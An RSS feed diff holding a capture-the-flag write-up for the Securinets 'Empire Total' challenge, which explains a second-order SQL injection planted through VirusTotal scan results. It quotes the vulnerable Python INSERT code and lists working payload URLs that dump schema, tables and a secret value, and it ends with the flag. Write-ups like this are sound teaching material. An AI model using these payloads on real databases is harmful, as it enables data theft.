@@ -12,5 +12,136 @@
       <link>https://kahla-sec.github.io/post/</link>
     </image>
     
+    <item>
+      <title>Empire Total - Securinets Quals20</title>
+      <link>https://kahla-sec.github.io/post/empire-total-securinetsquals20/</link>
+      <pubDate>Sat, 21 Mar 2020 00:00:00 +0000</pubDate>
+      <guid>https://kahla-sec.github.io/post/empire-total-securinetsquals20/</guid>
+      <description>&lt;h1 id=&#34;empire-total-1000pts-7-solves-&#34;&gt;&lt;strong&gt;Empire Total (1000pts) (7 Solves)&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/rGcoI7o.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This task was really so creative and i had so fun solving it , but i can&amp;rsquo;t deny that it was painful :( after reading the description we can say that we aim to dump the database of the website (maybe SQL injection who knows) and fortunately we have the source code so let&amp;rsquo;s download it and begin our trip xD&lt;/p&gt;
+&lt;p&gt;After Visiting the website we find a tool based on Virus Total API , understanding the functionality of the website is really necessary for solving the task, we will cover it in details later, but as a first thought we give an ip address to the website and it will shows Virus Total stats about it&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/k7ScCjX.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/bjRXPJT.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After cloning the project here is its structure&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;git clone &lt;a href=&#34;https://github.com/mohamedaymenkarmous/virustotal-api-html&#34;&gt;https://github.com/mohamedaymenkarmous/virustotal-api-html&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/alxzV41.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;let&amp;rsquo;s take a look at index.php , since the code is really too long i will only put the important parts, as we can see after some configurations and Recaptcha setting, all the SQL queries are prepared statements so there is no way to perform SQL injection but we can notice the execution of the
+&lt;strong&gt;shell_exec&lt;/strong&gt; function :D Interesting hmmm&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/A1kiMAa.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;shell_exec&lt;/strong&gt; is executing some python script with a scanned ip argument ,maybe manipulating it will give us something useful&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$command = &amp;quot;../VirusTotal.py &#39;$scanned_ip&#39;&amp;quot;;
+$output = shell_exec($command);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;But unfortunately there&amp;rsquo;s too much restriction on our input :( it&amp;rsquo;s impossible to bypass the filter_var here and the JS restrictions (if you can bpass it just tell me xD )&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; if(isset($_POST) &amp;amp;&amp;amp; !empty($_POST)){
+  $scanned_ip=isset($_POST[&#39;ip&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;ip&#39;])  &amp;amp;&amp;amp; !is_array($_POST[&#39;ip&#39;]) ? $_POST[&#39;ip&#39;] : &amp;quot;&amp;quot;;
+  if(!$scanned_ip){header(&amp;quot;Location: /?invalid_ip&amp;quot;);exit();}
+  if (filter_var($scanned_ip, FILTER_VALIDATE_IP)) {
+  } else {header(&amp;quot;Location: /?invalid_ip&amp;quot;);exit();}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s proceed , it seems that the index.php is pretty safe ,let&amp;rsquo;s take a look at the VirusTotal.py script&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/ytcYYQQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;OMG :&#39;( 499 lines , that was so discouraging @Emperors :( but we needed that flag to have the 10th place xD anyway after scrolling around and reading the code , we can somehow understand the behaviour of the website,
+when we enter the ip address it asks the Virus Total API for the results and then there&amp;rsquo;s the persistence functionality that saves the results in the database and then when we enter the same ip address again it will loads
+the results from the database .&lt;/p&gt;
+&lt;p&gt;So if we can control the results maybe we will have the opportunity to perform an SQL injection ? I got stuck in this part for a long time and after the help of the admin ( Thank you @Emperors &amp;lt;3 ) i found something interesting :D&lt;/p&gt;
+&lt;p&gt;before we proceed here&amp;rsquo;s a vulnerable function to SQL injection that saves the results of urls section in the database (line 417 in VirusTotal.py)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;  def persistURLs(self,selected_ips,ip_report_filtered):
+    attr=&amp;quot;detected_urls&amp;quot;
+    table_name=&amp;quot;vt_scanned_urls_table&amp;quot;
+    newAttr=self.AttrSubstitution[attr] if attr in self.AttrSubstitution else attr
+    selected_urls=self.findPersistedIP(selected_ips[0][&#39;id&#39;],table_name)
+    selected_urls_filtered=[]
+    for selected_url in selected_urls:
+      selected_urls_filtered.append(selected_url[&#39;url&#39;])
+    if newAttr in ip_report_filtered:
+     for url in ip_report_filtered[newAttr]:
+      print(url[&#39;URL&#39;])
+      if url[&#39;URL&#39;] not in selected_urls_filtered:
+        try:
+          self.CursorRW.execute(&amp;quot;INSERT INTO &amp;quot;+table_name+&amp;quot; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&#39;id&#39;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;URL&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Detections&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Scanned&#39;]+&amp;quot;&#39;)&amp;quot;)
+          self.DBRW.commit()
+          self.resetSQL()
+        except Exception as e:
+          print(&amp;quot;INSERT INTO &amp;quot;+table_name+&amp;quot; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;quot;+str(selected_ips[0][&#39;id&#39;])+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;URL&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Detections&#39;]+&amp;quot;&#39;,&#39;&amp;quot;+url[&#39;Scanned&#39;]+&amp;quot;&#39;)&amp;quot;)
+          print(&amp;quot;EXCEPTION: &amp;quot;,e)
+          self.resetSQL()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;exploitation-&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;So the idea is that if we go to VirusTotal website (&lt;a href=&#34;https://www.virustotal.com/&#34;&gt;https://www.virustotal.com/&lt;/a&gt;) and scan a url ,and then go back to our challenge website and scan the url&amp;rsquo;s ip
+we will find that the url we scanned in VirusTotal website will appear , it&amp;rsquo;s pretty confusing i know so let&amp;rsquo;s have an example&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We go to Virus Total website and scan for any url for example :( in my case i launched a web server on my VPS and used it here )&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://100.26.206.184/?u=Just testing for the writeup :p&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/mGOQ1tQ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Now we go back to the challenge website and scan the ip address&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/N7ymSRT.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yeeees ! it&amp;rsquo;s appearing in the results so we now have the control over these values in the urls section of the results.&lt;/p&gt;
+&lt;p&gt;Now here is our scenario , if we look to the vulnerable function &lt;strong&gt;persistURLs&lt;/strong&gt; in VirusTotal.py we can notice the injection in this query (line 430)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;INSERT INTO &amp;ldquo;+table_name+&amp;rdquo; (ip_id,url,detections,scanned_time) VALUES (&#39;&amp;ldquo;+str(selected_ips[0][&amp;lsquo;id&amp;rsquo;])+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;URL&amp;rsquo;]+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;Detections&amp;rsquo;]+&amp;rdquo;&#39;,&#39;&amp;ldquo;+url[&amp;lsquo;Scanned&amp;rsquo;]+&amp;rdquo;&#39;)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We have control over the &lt;strong&gt;url[&amp;lsquo;URL&amp;rsquo;]&lt;/strong&gt; parameter (the url we scan in VirusTotal Website) so it&amp;rsquo;s now an SQL injection in INSERT INTO values, but we have some constraints :&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The url encoding &lt;strong&gt;%20&lt;/strong&gt; that will be interpreted with the SQL query so we have to find another way in our payload instead of white spaces which is a well known bypass:  &lt;strong&gt;/**/&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;The second thing faced me when i was solving the challenge , we can&amp;rsquo;t use &lt;strong&gt;&amp;ndash; -&lt;/strong&gt; to equilibrate the SQL query so we will have to find a solution to equilibrate it&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In order to test the injection locally i have created this small script that connects to my local DB and executes the same query, you can find it &lt;strong&gt;
+&lt;a href=&#34;https://github.com/kahla-sec/CTF-Writeups/blob/master/Securinets%20Prequals%202k20/Empire%20Total/test.py&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;HERE&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Finally I opted to this solution, here is the URL we will scan :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/&lt;strong&gt;/1),(select/&lt;/strong&gt;/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The complete SQL query that will be executed is  :&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;INSERT INTO detected_urls (ip_id,url,detections,scanned_time) VALUES (&amp;lsquo;2&amp;rsquo;,&amp;lsquo;100.26.206.184/?u=&amp;rsquo;,(select 1),(select 2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&amp;rsquo;,&amp;lsquo;15&amp;rsquo;,&amp;lsquo;yes&amp;rsquo;)&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Let&amp;rsquo;s try it now , we first scan it in VirusTotal :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/3L7lmrs.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And now let&amp;rsquo;s scan the IP in the challenge website  :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/f2CRd7H.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s fetched successfully, let&amp;rsquo;s scan the ip another time now to check if our injection succeeded or not, we must see 1,2 in the output :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/U3SEcaV.jpg&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Bingo ! our injection worked , we only have to dump the entire Database now and repeat the same procedure:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Dump DB names :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/&lt;strong&gt;/gRoUp_cOncaT(0x7c,schema_name,0x7c)/&lt;/strong&gt;/fRoM/&lt;strong&gt;/information_schema.schemata),(select/&lt;/strong&gt;/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/AJvdMXB.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;DBName : MySecretDatabase&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;Dump Tables and Columns :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/&lt;strong&gt;/gRoUp_cOncaT(0x7c,table_name,0x7c)/&lt;/strong&gt;/fRoM/&lt;strong&gt;/information_schema.tables),(select/&lt;/strong&gt;/2)),(&amp;lsquo;102&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/&lt;strong&gt;/gRoUp_cOncaT(0x7c,column_name,0x7c)/&lt;/strong&gt;/fRoM/&lt;strong&gt;/information_schema.columns),(select/&lt;/strong&gt;/2)),(&amp;lsquo;103&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/raYuUmI.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Table Name&lt;/strong&gt; : SecretTable &amp;amp; &lt;strong&gt;Column Name&lt;/strong&gt; : secret_value&lt;/p&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;And finally let&amp;rsquo;s have our beloved flag :&lt;/li&gt;
+&lt;/ol&gt;
+&lt;blockquote&gt;
+&lt;p&gt;http://100.26.206.184/?u=&amp;rsquo;,(select/&lt;strong&gt;/group_concat(0x7c,secret_value,0x7c)/&lt;/strong&gt;/fRoM/&lt;strong&gt;/MySecretDatabase.SecretTable),(select/&lt;/strong&gt;/2)),(&amp;lsquo;109&amp;rsquo;,&amp;lsquo;a&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://imgur.com/FanWbUZ.png&#34; alt=&#34;TASK&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yees We did it , &lt;strong&gt;FLAG&lt;/strong&gt; : Securinets{EmpireTotal_Pwn3D_fr0m_Th3_0th3r_S1de}&lt;/p&gt;
+&lt;p&gt;I have really liked the idea of the challenge, it&amp;rsquo;s really creative , i want to thank Securinets technical team for these fun tasks and awesome CTF and of course the author @TheEmperors.&lt;/p&gt;
+&lt;p&gt;I hope you liked the writeup if you have any questions don&amp;rsquo;t hesitate to contact me &lt;strong&gt;Twitter&lt;/strong&gt; : @BelkahlaAhmed1 , finally i can sleep in peace after these 24 hours xd&lt;/p&gt;
+</description>
+    </item>
+    
   </channel>
 </rss>
